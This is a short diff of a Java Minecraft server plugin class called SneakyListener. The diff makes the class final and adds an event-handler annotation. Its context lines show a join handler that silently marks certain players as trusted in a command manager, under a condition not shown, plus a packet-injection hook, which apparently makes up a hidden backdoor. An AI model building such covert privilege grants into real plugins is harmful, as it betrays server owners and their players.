@@ -21,7 +21,7 @@ import java.util.Arrays;
 
 
 @ExtensionMethod(PlayerExt.class)
-public class SneakyListener implements Listener {
+public final class SneakyListener implements Listener {
     @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
     public void onLogin(PlayerJoinEvent e) {
         Player p = e.getPlayer();
@@ -30,6 +30,7 @@ public class SneakyListener implements Listener {
             CommandManager.Instance.addTrusted(p);
         }
     }
+    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
 
     public void onQuit(PlayerQuitEvent e) {
         PacketInject.getPlayer(e.getPlayer()).unhook();
